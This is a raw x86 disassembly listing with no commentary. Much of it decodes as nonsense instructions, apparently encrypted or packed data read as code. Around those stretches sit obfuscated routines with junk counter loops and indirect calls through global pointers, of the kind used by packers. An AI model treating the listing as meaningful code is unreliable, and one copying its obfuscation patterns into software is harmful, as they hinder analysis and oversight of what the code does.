  4082e0:	push   es
  4082e1:	or     BYTE PTR [ebp-0x4d2d19c6],0x28
  4082e8:	inc    edx
  4082e9:	popf   
  4082ea:	push   ecx
  4082eb:	dec    esi
  4082ec:	mov    ch,0x19
  4082ee:	icebp  
  4082ef:	push   esi
  4082f0:	mov    ds:0xdbdf6947,eax
  4082f5:	lods   eax,DWORD PTR ds:[esi]
  4082f6:	(bad)  
  4082f8:	mov    esp,0x6c171cd2
  4082fd:	dec    eax
  4082fe:	adc    ecx,DWORD PTR [edx-0x4a]
  408301:	lea    edi,[ecx-0x79]
  408304:	(bad)
  408307:	push   ebx
  408308:	inc    edx
  408309:	inc    ebp
  40830a:	imul   ebx,DWORD PTR [edi+0x6a],0xffffffae
  40830e:	dec    esp
  40830f:	cmp    eax,0x4cb06e43
  408314:	mov    bh,0x86
  408316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408317:	(bad)  
  408318:	mov    DWORD PTR [eax+0x57d4c1f9],0x250ceb21
  408322:	gs (bad) 
  408325:	push   es
  408326:	sbb    BYTE PTR [ebx+0x70185450],bl
  40832c:	pusha  
  40832d:	dec    esp
  40832e:	mov    ebp,0xea3075da
  408333:	dec    edi
  408334:	fnstcw WORD PTR [eax+0xc]
  408337:	(bad)  
  408338:	fdivr  st(6),st
  40833a:	jne    0x408328
  40833c:	out    0x21,al
  40833e:	sub    al,al
  408340:	(bad)  
  408341:	jmp    0x408311
  408343:	jae    0x408333
  408345:	push   ds
  408346:	retf   
  408347:	out    dx,al
  408348:	sbb    al,0x65
  40834a:	add    eax,0x9f84bdae
  40834f:	xor    BYTE PTR [ecx+0x384f1da2],ch
  408355:	dec    esp
  408356:	test   bh,ah
  408358:	div    DWORD PTR [ebx-0x3069ab36]
  40835e:	ss dec ecx
  408360:	bound  ebp,QWORD PTR [edi-0x84bf52]
  408366:	push   ebp
  408367:	xlat   BYTE PTR ds:[ebx]
  408368:	mov    edi,ecx
  40836a:	jp     0x408370
  40836c:	mov    DWORD PTR [edx],ecx
  40836e:	sbb    edi,DWORD PTR ds:0xf4a0ea7c
  408374:	and    al,0x63
  408376:	inc    ecx
  408377:	mov    edx,DWORD PTR [eax-0x7d4cefe8]
  40837d:	(bad)  
  40837e:	xchg   DWORD PTR [ebp+0x1b35f229],edi
  408384:	rcr    BYTE PTR [edi],1
  408386:	xchg   edi,eax
  408387:	push   eax
  408388:	mov    WORD PTR [esi],cs
  40838a:	inc    edi
  40838b:	jno    0x4083bf
  40838d:	ret    0x4ad8
  408390:	(bad)  
  408391:	in     al,dx
  408392:	sbb    ch,BYTE PTR [edi+0x7d]
  408395:	pop    esp
  408396:	imul   ebp,ebp,0x2e
  408399:	sub    DWORD PTR [bx+si-0x7b],eax
  40839d:	jl     0x40832a
  40839f:	pusha  
  4083a0:	and    bl,0xfa
  4083a3:	pop    es
  4083a4:	cld    
  4083a5:	xor    ecx,DWORD PTR [ecx]
  4083a7:	scas   eax,DWORD PTR es:[edi]
  4083a8:	jbe    0x408374
  4083aa:	enter  0x9bcf,0xd9
  4083ae:	push   ecx
  4083af:	jb     0x408405
  4083b1:	scas   al,BYTE PTR es:[edi]
  4083b2:	pop    es
  4083b3:	dec    edi
  4083b4:	les    ebx,FWORD PTR [eax-0x26]
  4083b7:	in     al,0x25
  4083b9:	rol    al,cl
  4083bb:	js     0x408367
  4083bd:	inc    esi
  4083be:	adc    edi,DWORD PTR [eax+0x5a]
  4083c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c2:	jns    0x4083a6
  4083c4:	push   ebx
  4083c5:	mov    dl,0x25
  4083c7:	push   es
  4083c8:	sub    al,0x1f
  4083ca:	fcomp  QWORD PTR [ecx-0x535c3377]
  4083d0:	mov    bl,0xb4
  4083d2:	mov    ebp,0x6382cce1
  4083d7:	add    bl,dh
  4083d9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083db:	xchg   edi,eax
  4083dc:	mov    ds:0x8d10e22e,al
  4083e1:	js     0x408387
  4083e3:	adc    ah,BYTE PTR [edi+0x78]
  4083e6:	gs add eax,0x6d3e0532
  4083ec:	mov    ?,WORD PTR [edi+0x3c]
  4083ef:	nop
  4083f0:	xchg   esp,eax
  4083f1:	push   ebp
  4083f2:	adc    eax,DWORD PTR [edi+0x0]
  4083f5:	cmp    ch,BYTE PTR [esi]
  4083f7:	adc    esp,DWORD PTR [edx+0x2157a2e1]
  4083fd:	push   cs
  4083fe:	(bad)  
  4083ff:	sbb    BYTE PTR [ebp+0x3043e2c2],ah
  408405:	mov    DWORD PTR [eax-0x716991d5],edi
  40840b:	bound  esp,QWORD PTR [edx-0x761838f1]
  408411:	pop    es
  408412:	cmc    
  408413:	mov    eax,ds:0xef48d8a8
  408418:	std    
  408419:	ja     0x408424
  40841b:	sbb    cl,BYTE PTR [edi-0x589230fb]
  408421:	adc    al,0xf8
  408423:	dec    ecx
  408424:	(bad)  
  408425:	mov    esp,0x168c1b45
  40842a:	cmp    al,bl
  40842c:	iret   
  40842d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842e:	inc    ebx
  40842f:	mov    ecx,0x600e10c
  408434:	mov    ah,0xc0
  408436:	adc    edi,eax
  408438:	mov    eax,0x32bcd83c
  40843d:	mov    ds:0x92fa4417,eax
  408442:	jecxz  0x40849c
  408444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408445:	xor    esi,ebp
  408447:	sbb    BYTE PTR [eax+0x6c],ah
  40844a:	or     ebx,0x31
  40844d:	paddsb mm7,mm1
  408450:	and    DWORD PTR [esi-0x6d914be4],edi
  408456:	cmp    dh,BYTE PTR [ebp-0x1a]
  408459:	xchg   ebx,eax
  40845a:	stos   DWORD PTR es:[edi],eax
  40845b:	pop    ebx
  40845c:	inc    esp
  40845d:	and    al,0xb7
  40845f:	aas    
  408460:	mov    esi,0xc1baaf77
  408465:	and    DWORD PTR [edx+0x33],0x8
  408469:	sar    BYTE PTR [eax-0x70],cl
  40846c:	int3   
  40846d:	jg     0x408478
  40846f:	push   ss
  408470:	fs ins DWORD PTR es:[edi],dx
  408472:	mov    bh,BYTE PTR [ebp-0x379bf5bd]
  408478:	adc    eax,DWORD PTR [ebx+0x24bde48b]
  40847e:	add    DWORD PTR [edi],esp
  408480:	rcl    DWORD PTR [ebp+0x69820f9c],0x18
  408487:	add    BYTE PTR [eax],al
  408489:	mov    edx,DWORD PTR [ebp-0x28]
  40848c:	sbb    edi,0x56c5
  408492:	mov    edi,DWORD PTR [ebp-0x4]
  408495:	xor    ebx,DWORD PTR ds:0x432dd6
  40849b:	xor    edx,eax
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	leave  
  408584:	icebp  
  408585:	adc    DWORD PTR [ebx-0x58],0x697070d4
  40858c:	jg     0x4085fe
  40858e:	jo     0x4085cd
  408590:	sub    DWORD PTR [ecx-0x4f],eax
  408593:	mov    ebx,0x1b7c1e3f
  408598:	cmp    cl,dh
  40859a:	daa    
  40859b:	and    al,0xf5
  40859d:	and    esp,DWORD PTR [ebp-0x960ab24]
  4085a3:	mov    ebp,0x807ede36
  4085a8:	xor    BYTE PTR [ecx-0x6f],al
  4085ab:	cmp    al,0xf3
  4085ad:	xor    al,0xd2
  4085af:	bound  edi,QWORD PTR [esi-0x6f]
  4085b2:	xor    bh,0xd9
  4085b5:	cmc    
  4085b6:	push   ecx
  4085b7:	data16 fnstcw WORD PTR [edi+ebp*8+0x10]
  4085bc:	dec    edx
  4085bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085be:	out    0x3c,al
  4085c0:	xchg   edi,eax
  4085c1:	mov    al,ds:0xe04b785e
  4085c6:	cmp    al,0x73
  4085c8:	(bad)  
  4085c9:	jg     0x4085b1
  4085cb:	enter  0x26a3,0xdf
  4085cf:	ss std 
  4085d1:	lock and dl,BYTE PTR [ecx-0x5f]
  4085d5:	mov    bl,0x20
  4085d7:	imul   ecx,DWORD PTR [ebx+edi*2-0x10],0xffffffd0
  4085dc:	ins    DWORD PTR es:[edi],dx
  4085dd:	adc    al,0x7
  4085df:	shl    BYTE PTR [edi-0x32],0x5c
  4085e3:	mov    bh,0x84
  4085e5:	xor    ah,al
  4085e7:	fs icebp 
  4085e9:	adc    DWORD PTR [esi],0x11995f04
  4085ef:	fnsave [ebx+ecx*2-0xd]
  4085f3:	inc    esi
  4085f4:	rol    esi,0xd5
  4085f7:	in     eax,0x28
  4085f9:	cdq    
  4085fa:	jns    0x4085d0
  4085fc:	cmp    ah,BYTE PTR [esi-0x3]
  4085ff:	fnsave [edx+0x3ae3180e]
  408605:	adc    al,0xab
  408607:	hlt    
  408608:	aas    
  408609:	inc    edi
  40860a:	hlt    
  40860b:	ins    BYTE PTR es:[edi],dx
  40860c:	ins    BYTE PTR es:[edi],dx
  40860d:	in     eax,0x80
  40860f:	aam    0x9
  408611:	xor    al,0x2f
  408613:	adc    al,0xd5
  408615:	out    0xb8,al
  408617:	mov    ebp,0xce619c67
  40861c:	(bad)  
  40861d:	push   eax
  40861e:	inc    esi
  40861f:	enter  0x1252,0x1e
  408623:	test   BYTE PTR [edx],ch
  408625:	fadd   QWORD PTR [esi-0x1cd762e9]
  40862b:	(bad)  
  40862c:	sub    ebx,ecx
  40862e:	bound  esi,QWORD PTR [ebx-0x21]
  408631:	mov    esp,DWORD PTR [ecx]
  408633:	aad    0xc5
  408635:	lea    ebx,[ebx]
  408637:	pop    ss
  408638:	shl    DWORD PTR ds:0xa21c0506,cl
  40863e:	jnp    0x408609
  408640:	arpl   WORD PTR [ebp-0x3904bbe2],cx
  408646:	sbb    BYTE PTR [ecx-0x72],dl
  408649:	pop    ebx
  40864a:	dec    ebp
  40864b:	mov    ds:0x1da8423f,eax
  408650:	xchg   BYTE PTR [eax+0x3b],ch
  408653:	or     bh,BYTE PTR [eax+ecx*4-0x49]
  408657:	or     edi,DWORD PTR [edx-0x45d2b2d1]
  40865d:	(bad)  
  40865e:	push   ss
  40865f:	iret   
  408660:	inc    edx
  408661:	add    eax,0x8db1c8c2
  408666:	mov    WORD PTR [esi+ecx*8],cs
  408669:	(bad)  
  40866a:	push   ebp
  40866b:	push   es
  40866c:	mov    ss,eax
  40866e:	fsub   QWORD PTR [esi-0x38]
  408671:	sub    al,0xe1
  408673:	jge    0x408656
  408675:	add    DWORD PTR [edx+0x10],esi
  408678:	pop    ecx
  408679:	test   DWORD PTR [ebp+ebx*1-0x37b30464],eax
  408680:	cmp    BYTE PTR [esi+0x59],0x27
  408684:	ds clc 
  408686:	pop    ecx
  408687:	jne    0x408672
  408689:	in     eax,dx
  40868a:	cs out dx,al
  40868c:	jle    0x408709
  40868e:	enter  0xe49b,0xc1
  408692:	test   eax,0xbb97cd87
  408697:	fs ja  0x40863c
  40869a:	out    0xf8,eax
  40869c:	sbb    al,0x5b
  40869e:	jle    0x408637
  4086a0:	push   ecx
  4086a1:	cli    
  4086a2:	leave  
  4086a3:	adc    al,0xda
  4086a5:	stos   BYTE PTR es:[edi],al
  4086a6:	or     BYTE PTR [eax],dl
  4086a8:	je     0x4086e2
  4086aa:	loope  0x408690
  4086ac:	pop    eax
  4086ad:	retf   
  4086ae:	or     ecx,DWORD PTR [ebp-0x7e432a31]
  4086b4:	push   ebx
  4086b5:	inc    ebx
  4086b6:	add    eax,0xe2ab27b8
  4086bb:	out    0x39,al
  4086bd:	fmul   QWORD PTR [ebx-0x3a]
  4086c0:	sub    DWORD PTR [ebx],edx
  4086c2:	cmc    
  4086c3:	popa   
  4086c4:	or     eax,0x1d501546
  4086c9:	jecxz  0x4086a3
  4086cb:	sbb    eax,0x5b5923d0
  4086d0:	lahf   
  4086d1:	mov    eax,ds:0xc2924b38
  4086d6:	add    al,0x74
  4086d8:	and    esp,0xffffff86
  4086db:	repz cdq 
  4086dd:	lods   al,BYTE PTR ds:[esi]
  4086de:	(bad)  
  4086df:	mov    edx,ecx
  4086e1:	fisub  WORD PTR [edi+0x44]
  4086e4:	je     0x40870b
  4086e6:	pop    es
  4086e7:	ret    0x23dd
  4086ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086eb:	or     DWORD PTR [ebx+edi*2],edi
  4086ee:	aam    0x59
  4086f0:	ret    0x80a6
  4086f3:	bound  edi,QWORD PTR [esi]
  4086f5:	arpl   WORD PTR [edi+0x15e26e81],di
  4086fb:	mov    eax,ds:0xd7d11268
  408700:	outs   dx,BYTE PTR ds:[esi]
  408701:	les    edi,FWORD PTR [ebx+0x4e]
  408704:	int    0x42
  408706:	and    DWORD PTR ds:0x45979633,esp
  40870c:	in     al,dx
  40870d:	mov    al,ds:0x38558709
  408712:	clc    
  408713:	lods   eax,DWORD PTR ss:[esi]
  408715:	stos   BYTE PTR es:[edi],al
  408716:	lahf   
  408717:	ret    0xe7fa
  40871a:	xchg   ebp,eax
  40871b:	repz xchg ebx,eax
  40871d:	icebp  
  40871e:	fdiv   DWORD PTR [ebx+0x60]
  408721:	mov    edi,0xc5e14c1e
  408726:	pop    ss
  408727:	imul   eax,DWORD PTR [ebp-0x6a],0x4d114379
  40872e:	xor    edi,DWORD PTR [ebx]
  408730:	dec    eax
  408731:	sub    ah,dl
  408733:	or     dh,bl
  408735:	sub    BYTE PTR [ebp+0x4a],dl
  408738:	xchg   bl,al
  40873a:	and    al,0x25
  40873c:	inc    ebx
  40873d:	mov    ebx,0x70ac377a
  408742:	loopne 0x40873b
  408744:	jl     0x4087c5
  408746:	cmp    eax,DWORD PTR [edx+0x69f587a4]
  40874c:	pop    ds
  40874d:	cmp    BYTE PTR [esi-0x765abb72],cl
  408753:	push   ds
  408754:	hlt    
  408755:	cwde   
  408756:	cmp    DWORD PTR [eax+0x6],edi
  408759:	sbb    dh,cl
  40875b:	stos   BYTE PTR es:[edi],al
  40875c:	xchg   ebx,eax
  40875d:	(bad)  
  40875e:	pop    esp
  40875f:	mov    gs,WORD PTR [ebx-0x71]
  408762:	pop    eax
  408763:	push   eax
  408764:	jb     0x408731
  408766:	mov    ebp,0xda9f9a03
  40876b:	out    dx,eax
  40876c:	data16 cmp al,0x8c
  40876f:	int    0x1d
  408771:	lea    edi,[ebp-0x6c]
  408774:	mov    esi,0x63419a9f
  408779:	pop    ebx
  40877a:	fnstsw WORD PTR [ecx+0x2067ea9]
  408780:	addr16 iret 
  408782:	ss (bad) 
  408784:	leave  
  408785:	cli    
  408786:	mov    edx,DWORD PTR [ebp-0x4]
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx+0x3fd5e84b]
  40892a:	pop    es
  40892b:	mov    eax,ds:0x697070d2
  408930:	jg     0x4089a2
  408932:	jo     0x40890a
  408934:	sbb    BYTE PTR [edi-0x41],bl
  408937:	adc    BYTE PTR [edi-0x29],dl
  40893a:	aam    0x1b
  40893c:	gs push ds
  40893e:	jb     0x408946
  408940:	dec    edi
  408941:	imul   ecx,DWORD PTR [edx+edx*1+0x40a835f7],0x8c55c519
  40894c:	(bad)  
  40894d:	adc    eax,0xc9145c9b
  408952:	jmp    0x8ec8dae9
  408957:	or     al,0xae
  408959:	in     eax,0xe
  40895b:	mov    ds:0x41f917c8,al
  408960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408961:	loope  0x4089ce
  408963:	test   BYTE PTR [ebp+0x60],ch
  408966:	mov    WORD PTR [eax+0x37d79d12],?
  40896c:	and    DWORD PTR [esp+esi*8],0x29
  408970:	out    0x8b,eax
  408972:	sar    BYTE PTR [edi-0x61],1
  408975:	retf   0x4601
  408978:	jno    0x40890f
  40897a:	mov    ah,0x2e
  40897c:	or     edi,edi
  40897e:	out    0xe6,eax
  408980:	cwde   
  408981:	out    0x9b,eax
  408983:	or     al,BYTE PTR [ebx]
  408985:	lods   eax,DWORD PTR ds:[esi]
  408986:	mov    DWORD PTR [edx-0x98f9c1],esi
  40898c:	dec    ebx
  40898d:	clc    
  40898e:	fisubr DWORD PTR [ecx+0x1a]
  408991:	sub    esi,esi
  408993:	fidivr WORD PTR [ebx-0x3b669ccb]
  408999:	jge    0x4089ce
  40899b:	jb     0x4089dd
  40899d:	fisttp QWORD PTR [edx-0x66]
  4089a0:	dec    esi
  4089a1:	pop    ebp
  4089a2:	jecxz  0x40897b
  4089a4:	jg     0x408a1d
  4089a6:	inc    edi
  4089a7:	in     al,0xe2
  4089a9:	sub    ecx,ebp
  4089ab:	pop    ss
  4089ac:	arpl   WORD PTR [ebp+0x56],bx
  4089af:	iret   
  4089b0:	xor    esi,DWORD PTR [edx+0x6432137e]
  4089b6:	inc    ecx
  4089b7:	cwde   
  4089b8:	call   0x3cc1f7e9
  4089bd:	cmp    DWORD PTR [ecx+0x15],ecx
  4089c0:	pop    edx
  4089c1:	arpl   WORD PTR [edx+esi*1],di
  4089c4:	cwde   
  4089c5:	push   es
  4089c6:	leave  
  4089c7:	fisubr WORD PTR [ebp+0x79]
  4089ca:	psubsw mm2,QWORD PTR [ebx+0x71cb6b79]
  4089d1:	mov    cl,0x47
  4089d3:	adc    edi,DWORD PTR [edi+ebp*8+0x4ffea92e]
  4089da:	jp     0x408a00
  4089dc:	sbb    eax,0xbe30ff23
  4089e1:	fwait
  4089e2:	mov    edx,0xe18c4825
  4089e7:	scas   eax,DWORD PTR es:[edi]
  4089e8:	adc    al,0x33
  4089ea:	sti    
  4089eb:	stc    
  4089ec:	lahf   
  4089ed:	pusha  
  4089ee:	test   al,0xb4
  4089f0:	(bad)  
  4089f1:	popf   
  4089f2:	jae    0x4089c0
  4089f4:	jb     0x4089a7
  4089f6:	shl    ebp,cl
  4089f8:	(bad)  
  4089f9:	push   ecx
  4089fa:	push   edi
  4089fb:	shr    al,cl
  4089fd:	out    dx,al
  4089fe:	sbb    DWORD PTR [edx+0x48],edx
  408a01:	jl     0x408a17
  408a03:	sub    ebp,DWORD PTR [ebx-0x3b]
  408a06:	popf   
  408a07:	std    
  408a08:	mov    ah,BYTE PTR [ecx+edx*2]
  408a0b:	rol    DWORD PTR [eax-0x788025c7],0x5e
  408a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a13:	ret    0xaa65
  408a16:	mov    dh,0xbb
  408a18:	adc    cl,bh
  408a1a:	push   edi
  408a1b:	xor    esp,eax
  408a1d:	jmp    0xabe9:0x5401eec1
  408a24:	push   ds
  408a25:	mov    DWORD PTR [ebx+0x668e92c6],eax
  408a2b:	out    dx,al
  408a2c:	mov    ebp,0xb1b1faf3
  408a31:	cdq    
  408a32:	je     0x408aac
  408a34:	inc    eax
  408a35:	or     al,0xba
  408a37:	fwait
  408a38:	loopne 0x408a25
  408a3a:	xor    BYTE PTR [eax],al
  408a3c:	popf   
  408a3d:	or     bh,bh
  408a3f:	ins    DWORD PTR es:[edi],dx
  408a40:	fs xchg ebx,eax
  408a42:	inc    edi
  408a43:	stos   DWORD PTR es:[edi],eax
  408a44:	sbb    eax,0x85b56878
  408a49:	or     BYTE PTR [esi-0x7a],dl
  408a4c:	xor    eax,0x17545de
  408a51:	fidiv  WORD PTR [ecx-0x61569315]
  408a57:	sub    eax,0xf02ed5bd
  408a5c:	stos   DWORD PTR es:[edi],eax
  408a5d:	cli    
  408a5e:	inc    eax
  408a5f:	idiv   DWORD PTR [eax-0xb]
  408a62:	cld    
  408a63:	jno    0x408a30
  408a65:	xchg   edi,eax
  408a66:	(bad)  
  408a67:	out    0x36,eax
  408a69:	dec    edx
  408a6a:	stc    
  408a6b:	fistp  QWORD PTR [ebx+0xe0d18c2]
  408a71:	pusha  
  408a72:	add    dl,BYTE PTR [ebx+eiz*8-0x2af83f7c]
  408a79:	ja     0x408aa3
  408a7b:	retf   0xf497
  408a7e:	mov    bl,0xc9
  408a80:	aas    
  408a81:	pop    ebp
  408a82:	mov    eax,ebp
  408a84:	push   es
  408a85:	push   edi
  408a86:	shr    DWORD PTR [eax],cl
  408a88:	out    0x68,al
  408a8a:	not    al
  408a8c:	xchg   ecx,edi
  408a8e:	ret    0xda42
  408a91:	outs   dx,BYTE PTR ds:[esi]
  408a92:	cmp    bh,BYTE PTR [edi-0x73]
  408a95:	push   edx
  408a96:	jecxz  0x408b16
  408a98:	inc    esi
  408a99:	or     BYTE PTR [esi],dh
  408a9b:	cmp    BYTE PTR [edx-0x7fee1144],cl
  408aa1:	into   
  408aa2:	fcmovbe st,st(3)
  408aa4:	push   cs
  408aa5:	xchg   edi,eax
  408aa6:	not    DWORD PTR [edx-0x7e]
  408aa9:	sub    dh,bh
  408aab:	loopne 0x408a8c
  408aad:	aam    0xe0
  408aaf:	xchg   ah,al
  408ab1:	mov    dh,0xc7
  408ab3:	jnp    0x408a78
  408ab5:	jmp    0x5de3:0x3a02d67a
  408abc:	fwait
  408abd:	mov    ecx,DWORD PTR [ecx]
  408abf:	xchg   ebp,eax
  408ac0:	xor    esi,esi
  408ac2:	or     DWORD PTR cs:[ecx],0x6c82b52a
  408ac9:	xor    DWORD PTR [eiz*4+0x500fac65],ebx
  408ad0:	ret    
  408ad1:	ja     0x408aa0
  408ad3:	ss jle 0x408b1c
  408ad6:	and    dh,BYTE PTR [edx]
  408ad8:	in     al,0xdf
  408ada:	mov    ecx,0x86cb0dc4
  408adf:	bound  edi,QWORD PTR [edi+0x10d75963]
  408ae5:	or     eax,eax
  408ae7:	xchg   dl,ch
  408ae9:	loop   0x408add
  408aeb:	(bad)  
  408aec:	imul   esp,DWORD PTR [edx-0x14],0x9606e84f
  408af3:	loop   0x408af1
  408af5:	lahf   
  408af6:	dec    eax
  408af7:	pop    ebp
  408af8:	sub    BYTE PTR [ebx],0xf8
  408afb:	pop    es
  408afc:	mov    bl,0x86
  408afe:	add    ebx,ecx
  408b00:	dec    esp
  408b01:	fdivrp st(5),st
  408b03:	out    0xcc,al
  408b05:	or     dh,dl
  408b07:	in     eax,dx
  408b08:	add    al,0xe9
  408b0a:	je     0x408b06
  408b0c:	dec    ebp
  408b0d:	stc    
  408b0e:	mov    al,ds:0x22831743
  408b13:	add    DWORD PTR [ebp+0x35],ebp
  408b16:	jecxz  0x408af8
  408b18:	pop    es
  408b19:	fdivr  DWORD PTR [esi+0xe6080df]
  408b1f:	ret    
  408b20:	cmp    ch,BYTE PTR [ebx+0x7d9abcd6]
  408b26:	mov    dh,0x6
  408b28:	sbb    al,BYTE PTR [edx+0x33fc7d8b]
  408b2e:	clc    
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
